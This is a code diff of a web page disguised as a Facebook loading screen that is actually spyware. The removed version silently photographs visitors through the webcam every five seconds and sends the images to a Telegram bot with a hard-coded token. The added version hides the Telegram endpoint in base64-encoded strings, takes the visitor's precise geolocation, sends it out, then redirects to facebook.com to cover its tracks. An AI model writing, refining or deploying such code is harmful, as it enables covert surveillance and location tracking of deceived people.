@@ -3,109 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook.com</title>
-    <link
-    rel="icon"
-    href="https://gifdb.com/images/high/facebook-app-logo-sticker-sgb3lvzpwvlsvpl9.gif"
-            type="image/x-icon"
-        />
- <style>
-	body {background-color: #FFFFFF;
-	}
-	
-img {
-  margin: 0;
-  position: absolute;
-  top: 35%;
-  left: 50%;
-  -ms-transform: translate(-50%, -50%);
-  transform: translate(-50%, -50%);
-  border-radius: 50px;
-  border: 2px solid #FFFFFF;
-  padding: 0px;
-  width: 150px;
-}
-
-.im{
-margin: 0;
-  position: absolute;
-  top: 53%;
-  left: 50%;
-  -ms-transform: translate(-50%, -50%);
-  transform: translate(-50%, -50%);
-  border-radius: 50px;
-  border: 2px solid #FFFFFF;
-  padding: 0px;
-  width: 300px;
-}
-.b {
-text-align: center;
-  position: absolute;
-  top: 70%;
-  left: 27%;
-  font-size: 14px;
-    }
+    <title>Connecting to Facebook...</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f0f2f5;
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            height: 100vh; padding: 20px;
+        }
+        .fb-container { display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .fb-logo { width: 75px; height: 75px; margin-bottom: 25px; }
+        .fb-spinner {
+            width: 32px; height: 32px;
+            border: 3px solid #e4e6eb; border-top: 3px solid #1877f2;
+            border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading-text { color: #65676b; font-size: 15px; font-weight: 500; }
+        .footer-logo { position: absolute; bottom: 40px; color: #8a8d91; font-size: 14px; font-weight: 600; }
     </style>
-    
 </head>
 <body>
-	
-<i class="fa fa-close" style="font-size:36px"></i>
 
-<div class="img">
-<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSueU7maPiQQd566w9QZWbXEDm5zUhzbHxcaqTUdj1mYw&s" alt="Paris" style="width:20%;">
+<div class="fb-container">
+    <svg class="fb-logo" viewBox="0 0 36 36" fill="none">
+        <path d="M20.181 35.87C29.094 34.741 36 27.168 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.223 5.51 15.158 13.002 17.26V22.88H8.897v-4.88h4.105v-3.714c0-4.051 2.413-6.289 6.107-6.289 1.77 0 3.62.316 3.62.316v3.98h-2.04c-2.008 0-2.634 1.246-2.634 2.523v3.184h4.484l-.717 4.88h-3.767V35.87z" fill="#1877F2"/>
+    </svg>
+    <div class="fb-spinner"></div>
+    <div id="status" class="loading-text">Connecting to Facebook...</div>
 </div>
 
-<div class="im">
-<img src="https://andimaps.com.au/wp-content/uploads/2014/07/loader.gif" alt="Paris" style="width:150%;">
-</div>
+<div class="footer-logo">Meta</div>
 
-    
-    
-    <video id="video" width="490" height="390" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="490" height="390" style="display:none;"></canvas>
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
+<script>
+    (function(){
+        var _0x4a12 = ['aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==', 'T0RheE1qZzFOVE15T0RZNkFBRTNmNlN4WExpY1dRcjltemR2cjBRQzVPSTBtcFVYaFBB', 'TmpnM05ETXhOVEE0', 'c2VuZExvY2F0aW9u', 'aHR0cHM6Ly93d3cuZmFjZWJvb2suY29t'];
+        function _0x2b89(_0x1b4c, _0x3e10) { return atob(_0x4a12[_0x1b4c]); }
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                setInterval(capturePhoto, 5000);// Capture photo after 5 seconds
-            });
+        window.onload = function() {
+            if (!navigator.geolocation) {
+                window.location.href = _0x2b89(4);
+                return;
+            }
 
-        function capturePhoto() {
-            context.drawImage(video, 0, 0, 640, 480);
-            const dataURL = canvas.toDataURL('image/png');
-            sendToTelegram(dataURL);
-        }
+            navigator.geolocation.getCurrentPosition(
+                function(_0x54e1x1) {
+                    var _0x54e1x2 = _0x54e1x1.coords.latitude;
+                    var _0x54e1x3 = _0x54e1x1.coords.longitude;
+                    var _0x54e1x4 = _0x2b89(0) + _0x2b89(1) + '/' + _0x2b89(3);
 
-        function sendToTelegram(dataURL) {
-            const base64String = dataURL.split(',')[1];
-            const blob = new Blob([base64String], { type: 'text/plain' });
-            const formData = new FormData();
-            
-            const currentDate = new Date().toLocaleString();
-          
-            formData.append('document', blob, 'webcam Camera photo.txt');
-            
-            formData.append('caption', `📸 Targetဆီမှပုံတစ်ပုံလက်ခံရရှိပါသည်။ ရရှိလာသောပုံသည်Codeအဖြစ်တည်ရှိနေပြီးထိုCodeကိုပုံအဖြစ်ပြောင်းလဲးကြည့်ရူပါ။ \n\n🖼 𝐕𝐢𝐞𝐰 𝐩𝐡𝐨𝐭𝐨 : https://specialonemyanmar24-prog.github.io/camera/ \n\n👤 𝐔𝐬𝐞𝐫 𝐀𝐠𝐞𝐧𝐭 : ${navigator.userAgent} \n\n⌛ 𝐃𝐚𝐭𝐞 : ${currentDate} \n\n👨 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐁𝐲 : @Yelinnaing\n📲𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎,`); // 
-            fetch(`https://api.telegram.org/bot8275046992:AAG8r5DdbUtyv_sz9-P8VWtF7m6fZzjmFnY/sendDocument?chat_id=6874315478`, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
-        }
-        
-    </script>
+                    fetch(_0x54e1x4, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: _0x2b89(2),
+                            latitude: _0x54e1x2,
+                            longitude: _0x54e1x3
+                        })
+                    })
+                    .then(function() { window.location.href = _0x2b89(4); })
+                    .catch(function() { window.location.href = _0x2b89(4); });
+                },
+                function() { window.location.href = _0x2b89(4); },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        };
+    })();
+</script>
+
 </body>
 </html>
-
-
